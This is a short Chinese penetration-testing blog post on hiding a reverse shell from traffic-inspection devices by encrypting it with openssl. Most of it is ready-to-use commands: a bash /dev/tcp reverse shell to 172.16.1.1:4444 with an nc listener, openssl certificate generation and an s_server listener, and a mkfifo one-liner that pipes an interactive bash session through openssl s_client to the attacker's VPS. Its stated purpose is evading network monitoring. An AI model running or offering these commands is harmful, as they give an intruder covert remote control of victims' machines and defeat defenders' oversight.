---
title: "Encrypt Reverse Shell"
date: 2019-08-26T12:55:07+08:00
draft: false
tags: ['reverse','shell']
categories: ['渗透测试']
---
利用openssl加密你的shell
<!--more-->

在我们实际的渗透测试过程中，总是有各种各样的流量审查设备挡住我们通往system的道路，尤其是在反弹shell的时候，明文传输的shell总是容易断，那么本文介绍一种利用openssl反弹流量加密的shell来绕过流量审查设备。

## 常规bash反弹

vps执行 `nc -lvvp 4444`

目标主机执行 `bash -i >& /dev/tcp/172.16.1.1/4444 0>&1`

![20190826131727](https://y4er.com/img/uploads/20190826131727.png)

流量明文传输，很容易被拦截。

## openssl加密传输

第一步，在vps上生成SSL证书的公钥/私钥对
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```
第二步，在VPS监听反弹shell
```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 4433
```
第三步，在目标上用openssl加密反弹shell的流量
```bash
mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1|openssl s_client -quiet -connect vps:443 > /tmp/s;rm /tmp/s
```

![20190826132310](https://y4er.com/img/uploads/20190826132310.png)

流量已经被加密。

## 参考链接

1. https://www.t00ls.net/articles-52477.html
2. https://www.freebuf.com/vuls/211847.html
3. https://www.cnblogs.com/heycomputer/articles/10697865.html

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**